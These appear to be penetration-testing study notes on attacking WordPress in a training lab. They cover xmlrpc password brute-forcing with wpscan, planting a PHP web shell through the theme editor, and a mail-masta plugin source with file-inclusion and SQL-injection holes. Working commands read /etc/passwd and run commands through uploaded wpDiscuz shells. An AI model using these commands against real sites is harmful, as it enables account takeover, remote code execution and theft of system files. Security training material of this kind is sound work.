
Login bruteforce via xmlrpc with wpscan
```shell-session
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```


A goodway to get a php web shell can be by adding a shell via admin panel to the theme editor

Executing on webshell added under theme editor in admin panel
```shell-session
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

Automated web shell upload via metasploit
https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/



#### Vulnerable Plugins

##### mail-masta

Vulnerable to local file inclusion and sql injection due to no input sanitization


Source code
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```


Attack command for local file inclusion
```shell-session
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```


##### wpDiscuz

Vulnerable to file upload bypass
[Exploit](https://www.exploit-db.com/download/49967)

Exploit Command used for exploit
```shell-session
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

Attack Command user for exploit
```shell-session
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```


